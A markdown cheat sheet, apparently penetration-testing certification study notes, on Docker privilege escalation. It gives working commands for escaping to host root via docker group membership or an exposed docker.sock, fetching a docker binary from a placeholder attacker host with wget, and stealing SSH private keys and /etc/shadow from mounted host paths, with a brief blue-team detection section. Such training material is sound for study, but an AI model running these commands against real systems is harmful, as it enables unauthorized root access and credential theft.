@@ -1,0 +1,183 @@
+🐳 Docker Privilege Escalation – CPTS Breakdown
+🧠 Summary
+Docker containers run applications in isolated environments, but when misconfigured (e.g., being in the docker group or a writable docker.sock), attackers can:
+
+Mount the host filesystem
+
+Interact with Docker as root
+
+Escape containers
+
+Create containers with elevated permissions
+
+🧭 Got This? Do That – Docker Attack Workflow
+✅ You’re in the docker group or can use Docker
+bash
+Copy
+Edit
+id | grep docker
+➡️ Mount root filesystem from host and spawn container:
+
+bash
+Copy
+Edit
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+🟢 Result: You now have full root access to the host.
+
+🔍 You found a Docker socket (e.g., /app/docker.sock)
+bash
+Copy
+Edit
+find / -name docker.sock 2>/dev/null
+➡️ Download Docker binary (if not present):
+
+bash
+Copy
+Edit
+wget http://<attacker-ip>:443/docker -O docker
+chmod +x docker
+➡️ Use the socket to list running containers:
+
+bash
+Copy
+Edit
+./docker -H unix:///app/docker.sock ps
+➡️ Mount the host’s root dir with a new container:
+
+bash
+Copy
+Edit
+./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+➡️ Exec into it:
+
+bash
+Copy
+Edit
+./docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
+cd /hostsystem
+🟢 You now control the host filesystem as root.
+
+📁 You notice a shared folder inside the container
+➡️ Example path:
+
+bash
+Copy
+Edit
+cd /hostsystem/home/cry0l1t3/.ssh
+cat id_rsa > cry0l1t3.priv
+➡️ Use the key to SSH into the host:
+
+bash
+Copy
+Edit
+chmod 600 cry0l1t3.priv
+ssh -i cry0l1t3.priv cry0l1t3@<host-ip>
+🔥 Escalation Patterns to Remember
+🔍 Finding	💥 Escalation Path
+docker group	Full root access via mount/chroot
+Writable docker.sock	Spawn root containers
+Volume mount to /	Host system exposure
+Docker binary inside container + socket	Use to control host via API
+SSH private keys in mounted folders	Lateral movement to real user accounts
+docker-compose.yml or leftover configs	May include credentials or mounted paths
+🚨 Tips & Pitfalls
+Always check if Docker binary is inside the container, or upload your own.
+
+Check for shared/mounted host paths — especially to /root, /home, /etc.
+
+If docker is installed with SUID (chmod u+s) — it might be exploitable even without being in the group.
+
+Don’t forget to check:
+
+bash
+Copy
+Edit
+docker images
+docker ps -a
+docker inspect <container>
+for more info on volumes, commands, and entrypoints.
+
+⚡ TL;DR One-Liner – Root via Docker Group
+bash
+Copy
+Edit
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+
+
+  [ You land on a box ]
+       │
+       ▼
+[ Am I in the docker group? ]
+       │
+       ├── Yes → 🟢 Run a root container to escape to host
+       │          docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+       │
+       └── No →
+              │
+              ▼
+     [ Is /var/run/docker.sock or any *.sock exposed & writable? ]
+              │
+              ├── Yes →
+              │     │
+              │     ├── Is docker binary present in the container?
+              │     │      ├── Yes → use it with:
+              │     │      │       docker -H unix:///path/to/socket ps
+              │     │      │       docker -H unix:///path/to/socket run --rm -it -v /:/mnt --privileged ubuntu chroot /mnt bash
+              │     │      │
+              │     │      └── No → upload docker binary:
+              │     │              wget http://attacker-ip:443/docker -O docker
+              │     │              chmod +x docker
+              │     │              Then repeat above
+              │     │
+              │     └── Profit: access `/mnt` = full host root FS access
+              │
+              └── No →
+                     │
+                     ▼
+        [ Can I exec into running containers? ]
+                     │
+                     ├── Yes →
+                     │     docker ps
+                     │     docker exec -it <container> /bin/bash
+                     │     Then look for:
+                     │     - Mounted host paths (e.g., /hostsystem, /mnt/root, /data)
+                     │     - SSH keys or config files
+                     │
+                     └── No →
+                            │
+                            ▼
+               [ Check for mount volumes in container metadata ]
+                            │
+                            └── docker inspect <container>
+                                   Look for HostConfig.Binds or Mounts
+                                   → Anything mounted from `/`, `/home`, `/root`, etc?
+                                   → Mount RW host path if possible
+
+🧠 Quick Tells You’re in a Host-Mounted Container
+ls /hostsystem shows full host FS layout
+
+cat /hostsystem/root/.ssh/id_rsa or /etc/shadow gives real creds
+
+You can chroot /hostsystem → instant root
+
+.sock files in weird places (/app/docker.sock, /tmp/docker.sock) = gateway to Docker daemon
+
+🧪 Additional Quick Checks
+bash
+Copy
+Edit
+id | grep docker           # Docker group?
+ls -l /var/run/docker.sock # World-writable or owned by docker?
+docker image ls            # Available images to abuse
+docker ps -a               # Running containers to inspect/exec into
+docker inspect <container> # Volumes and binds
+🛡️ Bonus Detection Check for Blue Team/OPSEC
+If you’re doing this in real life (or a monitored lab):
+
+Enumerating Docker images/containers often logs to Docker's event log
+
+Spawning a container from a mounted volume (-v /:/mnt) is very suspicious
+
+If AppArmor or seccomp is enabled, you might be blocked or limited
+
+
